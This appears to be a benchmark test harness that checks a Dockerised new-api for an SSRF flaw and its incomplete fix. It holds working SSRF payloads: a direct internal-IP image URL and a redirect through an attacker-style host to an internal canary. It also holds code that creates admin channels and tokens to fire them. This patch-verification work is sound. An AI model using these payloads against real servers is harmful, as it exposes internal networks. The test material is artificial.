#!/usr/bin/env python3
"""
Benign SSRF oracle for the new-api incomplete-fix case
(CVE-2025-59146 original SSRF  ->  CVE-2025-62155 302-redirect residual).

For a given new-api version (host port), the oracle:
  1. waits for /api/status,
  2. logs in as the bootstrapped root user (root/123456),
  3. creates a relay channel + an API token via the REAL admin API,
  4. sends a user chat-completion whose image_url is the SSRF payload,
  5. reads the internal canary's hit log (via `docker compose exec`) to decide
     whether the server-side fetch reached the intranet.

Detection = the canary recorded a request carrying ${PCB_FLAG}. The canary has
NO host port, so a hit can only mean new-api itself reached it -> SSRF bypass.

Payloads
  original  : direct internal URL  http://172.31.9.9:80/internal-secret.png
              (CVE-2025-59146 form) -> fetched on v0, blocked on v1 (blocklist).
  residual  : attacker URL http://11.11.11.10:8080/redirect that 302-redirects
              to the internal canary (CVE-2025-62155 form) -> followed unchecked
              on v1, blocked on v2 (redirect re-validated).

Usage:
  PCB_FLAG=<tok> python3 oracle.py --gate      # full matrix, prints gate JSON
  PCB_FLAG=<tok> python3 oracle.py --port 3011 --payload residual
"""
import argparse
import json
import os
import subprocess
import sys
import time
import urllib.request
import urllib.error

DIRECT_URL = "http://172.31.9.9:80/internal-secret.png"
REDIRECT_URL = "http://11.11.11.10:8080/redirect"
PAYLOADS = {"original": DIRECT_URL, "residual": REDIRECT_URL}

FLAG = os.environ.get("PCB_FLAG", "PCB_FLAG_UNSET")
COMPOSE_DIR = os.path.dirname(os.path.abspath(__file__))


def log(msg):
    print(msg, flush=True)


def http_json(method, url, data=None, headers=None, cookie=None):
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("Content-Type", "application/json")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        raw = resp.read().decode()
        set_cookie = resp.headers.get("Set-Cookie")
        try:
            return resp.status, json.loads(raw), set_cookie
        except Exception:
            return resp.status, raw, set_cookie
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw), None
        except Exception:
            return e.code, raw, None
    except Exception as e:
        return 0, str(e), None


def wait_ready(base, timeout=180):
    log("[*] waiting for %s/api/status ..." % base)
    deadline = time.time() + timeout
    while time.time() < deadline:
        st, body, _ = http_json("GET", base + "/api/status")
        if st == 200 and isinstance(body, dict) and body.get("success"):
            log("[+] ready: %s" % base)
            return True
        time.sleep(3)
    log("[!] timeout waiting for %s" % base)
    return False


ADMIN_USER = "root"
ADMIN_PASS = "rootpass123"


def ensure_setup(base):
    """These new-api versions require an explicit setup step to create root."""
    st, body, _ = http_json("GET", base + "/api/setup")
    if isinstance(body, dict) and body.get("data", {}).get("status"):
        return  # already initialized
    st, body, _ = http_json("POST", base + "/api/setup", {
        "username": ADMIN_USER,
        "password": ADMIN_PASS,
        "confirmPassword": ADMIN_PASS,
        "SelfUseModeEnabled": True,
        "DemoSiteEnabled": False,
    })
    log("[*] setup -> %s %s" % (st, body if isinstance(body, str) else body.get("message")))


def setup_relay(base):
    """Setup + login as root, create a channel + token. Returns sk key or None."""
    ensure_setup(base)
    st, body, cookie = http_json(
        "POST", base + "/api/user/login",
        {"username": ADMIN_USER, "password": ADMIN_PASS})
    if st != 200 or not isinstance(body, dict) or not body.get("success"):
        log("[!] login failed: %s %s" % (st, body))
        return None
    uid = body["data"]["id"]
    hdr = {"New-Api-User": str(uid)}
    # session cookie
    cke = None
    if cookie:
        cke = cookie.split(";")[0]
    log("[+] logged in as root uid=%s" % uid)

    # create channel (type 1 = OpenAI). base_url points at the attacker host so
    # it is a syntactically valid upstream; we never need a real completion.
    ch = {
        "mode": "single",
        "channel": {
            "name": "pcb-dummy",
            "type": 1,
            "key": "sk-pcb-dummy",
            "base_url": "http://11.11.11.10:8080",
            "models": "gpt-4o",
            "group": "default",
            "groups": ["default"],
            "model_mapping": "",
            "status": 1,
        },
    }
    st, body, _ = http_json("POST", base + "/api/channel/", ch, hdr, cke)
    log("[*] create channel -> %s %s" % (st, body if isinstance(body, str) else body.get("message")))

    # create token
    tk = {
        "name": "pcb-token",
        "expired_time": -1,
        "unlimited_quota": True,
        "remain_quota": 500000,
        "model_limits_enabled": False,
        "group": "default",
    }
    st, body, _ = http_json("POST", base + "/api/token/", tk, hdr, cke)
    log("[*] create token -> %s %s" % (st, body if isinstance(body, str) else body.get("message")))

    # fetch the token key
    st, body, _ = http_json("GET", base + "/api/token/?p=0&size=10", None, hdr, cke)
    if not (isinstance(body, dict) and body.get("success")):
        log("[!] list tokens failed: %s %s" % (st, body))
        return None
    items = body["data"]
    if isinstance(items, dict):
        items = items.get("items") or items.get("records") or items.get("data") or []
    if not items:
        log("[!] no tokens found")
        return None
    key = items[0]["key"]
    log("[+] token key acquired")
    return "sk-" + key


def canary_reset():
    subprocess.run(
        ["docker", "compose", "exec", "-T", "canary", "sh", "-c",
         ": > /var/log/canary/hits.log"],
        cwd=COMPOSE_DIR, capture_output=True)


def canary_hits():
    r = subprocess.run(
        ["docker", "compose", "exec", "-T", "canary", "cat",
         "/var/log/canary/hits.log"],
        cwd=COMPOSE_DIR, capture_output=True, text=True)
    return r.stdout or ""


def fire(base, sk, image_url):
    payload = {
        "model": "gpt-4o",
        "stream": False,
        "messages": [{
            "role": "user",
            "content": [
                {"type": "text", "text": "describe"},
                {"type": "image_url",
                 "image_url": {"url": image_url, "detail": "high"}},
            ],
        }],
    }
    st, body, _ = http_json(
        "POST", base + "/v1/chat/completions", payload,
        {"Authorization": "Bearer " + sk})
    snippet = body if isinstance(body, str) else json.dumps(body)
    log("[*] relay resp %s: %s" % (st, snippet[:300]))


def run_case(port, payload_name, sk_cache):
    base = "http://127.0.0.1:%d" % port
    sk = sk_cache.get(port)
    if sk is None:
        sk = setup_relay(base)
        sk_cache[port] = sk
    if not sk:
        return {"error": "setup failed"}
    image_url = PAYLOADS[payload_name]
    canary_reset()
    log("[*] firing payload=%s url=%s at %s" % (payload_name, image_url, base))
    fire(base, sk, image_url)
    time.sleep(3)
    hits = canary_hits()
    reached = FLAG in hits
    log("[=] canary reached=%s (hit lines=%d)" % (reached, len([l for l in hits.splitlines() if l.strip()])))
    return {"payload": payload_name, "url": image_url, "flag_reached": reached,
            "hit_log": hits.strip()}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true")
    ap.add_argument("--port", type=int)
    ap.add_argument("--payload", choices=list(PAYLOADS))
    args = ap.parse_args()

    if FLAG == "PCB_FLAG_UNSET":
        log("[!] PCB_FLAG not set")
        sys.exit(2)

    sk_cache = {}

    if args.gate:
        ports = {"v0": 3010, "v1": 3011, "v2": 3012}
        for p in ports.values():
            if not wait_ready("http://127.0.0.1:%d" % p):
                log("[!] a profile is not up; run `docker compose --profile all up -d` first")
                sys.exit(3)
        r = {}
        r["original@v0"] = run_case(ports["v0"], "original", sk_cache)
        r["original@v1"] = run_case(ports["v1"], "original", sk_cache)
        r["residual@v1"] = run_case(ports["v1"], "residual", sk_cache)
        r["residual@v2"] = run_case(ports["v2"], "residual", sk_cache)
        # extra observability
        r["residual@v0"] = run_case(ports["v0"], "residual", sk_cache)

        gate = {
            "original_poc_reaches_flag_on_v0": r["original@v0"]["flag_reached"],
            "original_poc_blocked_on_v1": not r["original@v1"]["flag_reached"],
            "bypass_poc_reaches_flag_on_v1": r["residual@v1"]["flag_reached"],
            "residual_blocked_on_v2": not r["residual@v2"]["flag_reached"],
        }
        passed = all(gate.values())
        out = {"gate": gate, "passed": passed, "detail": r}
        log("\n===== GATE RESULT =====")
        log(json.dumps(out, indent=2))
        sys.exit(0 if passed else 1)

    if args.port and args.payload:
        base = "http://127.0.0.1:%d" % args.port
        wait_ready(base)
        r = run_case(args.port, args.payload, sk_cache)
        log(json.dumps(r, indent=2))
        sys.exit(0)

    ap.print_help()


if __name__ == "__main__":
    main()
